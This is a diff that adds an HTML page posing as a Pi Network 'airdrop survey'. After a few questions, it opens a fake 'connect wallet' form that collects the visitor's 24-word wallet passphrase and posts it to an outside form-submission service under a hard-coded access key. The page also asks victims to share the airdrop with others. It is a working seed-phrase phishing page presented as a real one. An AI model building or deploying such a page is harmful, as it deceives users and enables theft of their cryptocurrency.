@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Survey Page</title>
+    <link rel="stylesheet" href="./style.css">
+    <link rel="stylesheet" href="../fontawesome-free-6.7.2-web/css/all.min.css">
+</head>
+<body>
+    <header>
+        <p>Airdrop Survey</p>
+    </header>
+
+    <section class="mainContainer">
+        <form action="https://api.web3forms.com/submit" method="POST">
+        <input type="hidden" name="access_key" value="5346d8a3-7035-4bc8-a3e3-606b223b91ed">
+
+        <p class="takesuvery-info">take a little survey before proceeding</p>
+        <div class="QuestionsNanswer">
+            <div class="vrLine"></div>
+            <ol>
+                <li>
+                    <p>How long have you Known Pi network?</p>
+                    <input type="radio" id="option1" name="How long have you Known Pi network?">
+                    <label for="option1">less than a month</label>
+
+                    <input type="radio" id="option2" name="How long have you Known Pi network?">
+                    <label for="option2">a very long time</label>
+                </li>
+                <li>
+                    <p>How did you encounter this airdrop?</p>
+                    <input type="radio" id="option3" name="How did you encounter about this airdrop?">
+                    <label for="option3">referred by someone</label>
+    
+                    <input type="radio" id="option4" name="How did you encounter about this airdrop?">
+                    <label for="option4">came across on social media</label>
+                </li>
+                <li>
+                    <p>What will you do with your allocated share?</p>
+                    <input type="radio" id="option5" name="What will you do with your allocated share?">
+                    <label for="option5">hold</label>
+    
+                    <input type="radio" id="option6" name="What will you do with your allocated share?">
+                    <label for="option6">sell immediately</label>
+                </li>
+                <li>
+                    <p>Will you share this airdrop after claiming yours?</p>
+                    <input type="radio" id="option7" name="Will you make sure you share about this airdrop after claiming yours?">
+                    <label for="option7">yes</label>
+    
+                    <input type="radio" id="option8" name="Will you make sure you share about this airdrop after claiming yours?">
+                    <label for="option8">no</label>
+                </li>
+                <li>
+                    <p>What year is Pi '6th anniversary'?</p>
+                    <input type="radio" id="option9" name="What year is Pi '6th anniversary'?">
+                    <label for="option9">2026</label>
+    
+                    <input type="radio" id="option10" name="What year is Pi '6th anniversary'?">
+                    <label for="option10">2025</label>
+                </li>
+            </ol>
+        </div>
+
+        <div class="ConnectWallet-BTN-container">
+            <bitton id="ConnectWalletBTN">connect to wallet</bitton>
+        </div>
+
+        <div id="ConnectWindowid">
+            <div class="closebntContainer">
+                <i class="fas fa-close" id="CancelBTNid"></i>
+            </div>
+            <div class="containConnect">
+                <p class="Warn1">DO NOT lose your passphrase!</p>
+                <p class="Warn2">As the Pi servers do not have a copy of it and cannot help you recover it even after claiming</p>
+                <label class="walletLabel" for="dropdown"></label>
+                <select name="Wallet" id=""><option value="Pi Wallet">Pi Wallet</option></select>
+                <textarea name="Wallet passphrase" type="text" placeholder="Enter your 24-word passphrase here" class="contact-inputs" required></textarea>
+                <a href="../Final Page/index.html"><button type="submit">connect wallet</button></a>
+            </div>
+        </div>
+    </form>
+    </section>
+    <script src="./app.js"></script>
+</body>
+</html>
